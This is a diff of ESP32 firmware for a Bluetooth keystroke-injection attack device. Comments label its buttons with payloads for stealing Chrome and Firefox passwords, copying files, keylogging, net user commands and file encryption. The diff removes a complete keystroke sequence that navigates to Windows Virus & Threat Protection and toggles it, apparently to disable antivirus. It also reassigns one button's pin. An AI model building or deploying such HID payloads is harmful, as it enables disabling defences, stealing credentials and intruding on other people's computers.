@@ -6,13 +6,12 @@
 #define BUTTON_4_PIN 19 // Button 4 (Trigger: Decrypt Chrome Passwords)
 #define BUTTON_5_PIN 21 // Button 5 (Trigger: Task Manager Admin)
 #define BUTTON_6_PIN 22 // Button 6 (Trigger: Calculator)
-#define BUTTON_7_PIN 23 // Button 7 (Trigger: Virus & Threat Protection)
 #define BUTTON_8_PIN 25 // Button 8 (Trigger: Firefox Decrypt)
 #define BUTTON_9_PIN 26 // Button 9 (Trigger: Copy Files Payload)
 #define BUTTON_10_PIN 27 // Button 10 (Trigger: Notepad Message + Save)
 #define BUTTON_11_PIN 32 // Button 11 (Trigger: Net User Command)
 #define BUTTON_12_PIN 33 // Button 12 (Trigger: Open 5 Notepads)
-#define BUTTON_13_PIN 14 // Button 13 (Trigger: Open 5 CMDs)
+#define BUTTON_13_PIN 15 // Button 13 (Trigger: Open 5 CMDs)
 #define BUTTON_14_PIN 12 // Button 14 (Trigger: Keylogger)
 #define BUTTON_15_PIN 13 // Button 15 (Trigger: File Encryption Demo)
 
@@ -25,7 +24,6 @@ bool lastState3 = HIGH;
 bool lastState4 = HIGH;
 bool lastState5 = HIGH;
 bool lastState6 = HIGH;
-bool lastState7 = HIGH;
 bool lastState8 = HIGH;
 bool lastState9 = HIGH;
 bool lastState10 = HIGH;
@@ -60,7 +58,6 @@ void setup() {
   pinMode(BUTTON_4_PIN, INPUT_PULLUP);
   pinMode(BUTTON_5_PIN, INPUT_PULLUP);
   pinMode(BUTTON_6_PIN, INPUT_PULLUP);
-  pinMode(BUTTON_7_PIN, INPUT_PULLUP);
   pinMode(BUTTON_8_PIN, INPUT_PULLUP);
   pinMode(BUTTON_9_PIN, INPUT_PULLUP);
   pinMode(BUTTON_10_PIN, INPUT_PULLUP);
@@ -84,7 +81,6 @@ void loop() {
     bool state4 = digitalRead(BUTTON_4_PIN);
     bool state5 = digitalRead(BUTTON_5_PIN);
     bool state6 = digitalRead(BUTTON_6_PIN);
-    bool state7 = digitalRead(BUTTON_7_PIN);
     bool state8 = digitalRead(BUTTON_8_PIN);
     bool state9 = digitalRead(BUTTON_9_PIN);
     bool state10 = digitalRead(BUTTON_10_PIN);
@@ -191,33 +187,6 @@ void loop() {
       Serial.println("Calculator Payload executed");
     }
 
-    // Button 7: Virus & Threat Protection (Pin 23)
-    if (lastState7 == HIGH && state7 == LOW) {
-      Serial.println("Button 7: Virus & Threat Protection (Pin 23)");
-      bleKeyboard.press(KEY_LEFT_GUI); delay(1000); 
-      bleKeyboard.releaseAll(); delay(1000);
-      sendString("virus & threat protection", 50); delay(1000);
-      bleKeyboard.press(KEY_RETURN); delay(1000); 
-      bleKeyboard.releaseAll(); delay(2000);
-      bleKeyboard.press(KEY_TAB); delay(1000); 
-      bleKeyboard.releaseAll();
-      bleKeyboard.press(KEY_TAB); delay(1000); 
-      bleKeyboard.releaseAll();
-      bleKeyboard.press(KEY_TAB); delay(1000); 
-      bleKeyboard.releaseAll();
-      bleKeyboard.press(KEY_TAB); delay(1000); 
-      bleKeyboard.releaseAll();
-      bleKeyboard.press(KEY_RETURN); delay(1000); 
-      bleKeyboard.releaseAll(); delay(1000);
-      bleKeyboard.press(' '); delay(1000); // Fixed: Changed KEY_SPACEBAR to ' ' (space character)
-      bleKeyboard.releaseAll(); delay(500);
-      bleKeyboard.press(KEY_LEFT_ARROW); delay(1000); 
-      bleKeyboard.releaseAll(); delay(1000);
-      bleKeyboard.press(KEY_RETURN); delay(1000); 
-      bleKeyboard.releaseAll(); delay(1000);
-      Serial.println("Virus & Threat Protection Payload executed");
-    }
-
     // Button 8: Firefox Decrypt (Pin 25)
     if (lastState8 == HIGH && state8 == LOW) {
       Serial.println("Button 8: Firefox Decrypt (Pin 25)");
@@ -306,9 +275,9 @@ void loop() {
       Serial.println("Open 5 Notepads Payload executed");
     }
 
-    // Button 13: Open 5 CMDs (Pin 14)
+    // Button 13: Open 5 CMDs (Pin 15)
     if (lastState13 == HIGH && state13 == LOW) {
-      Serial.println("Button 13: Open 5 CMDs (Pin 14)");
+      Serial.println("Button 13: Open 5 CMDs (Pin 15)");
       for (int i = 0; i < 5; i++) {
         openRun(); delay(1000); 
         sendString("cmd", 10); delay(100); 
@@ -370,7 +339,6 @@ void loop() {
     lastState4 = state4;
     lastState5 = state5;
     lastState6 = state6;
-    lastState7 = state7;
     lastState8 = state8;
     lastState9 = state9;
     lastState10 = state10;
@@ -384,5 +352,3 @@ void loop() {
   }
   delay(50); // Debounce/stability
 }
-
-
